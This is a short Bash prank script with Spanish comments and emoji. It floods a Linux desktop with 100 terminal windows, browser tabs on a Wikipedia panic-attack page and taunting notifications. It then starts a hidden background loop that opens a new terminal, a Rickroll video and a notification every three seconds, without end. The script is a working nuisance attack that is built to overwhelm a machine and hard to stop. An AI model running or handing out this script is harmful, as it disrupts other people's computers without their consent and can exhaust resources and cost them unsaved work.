#!/bin/bash
echo "😈 DESATANDO EL CAOS... 😈"

cantidad=100  # Número de ventanas a abrir

for ((i=1; i<=cantidad; i++)); do
    gnome-terminal &  # Abre una nueva terminal
    xdg-open "https://es.wikipedia.org/wiki/Ataque_de_pánico" &  # Página troll en el navegador
    notify-send "😆 JUEGA A CERRAR TODO" "¡Que la fuerza te acompañe!" &
    sleep 0.2  # Pequeña pausa para que el sistema no lo bloquee inmediatamente
done

echo "🔥 Cargando scripts ocultos..."

# Bucle infinito para abrir más ventanas cada 3 segundos
(while true; do
    gnome-terminal &
    xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ" &  # Rickroll clásico 😆
    notify-send "💀 AÚN NO HAS TERMINADO!" "Te va a costar cerrar todo..."
    sleep 3
done) &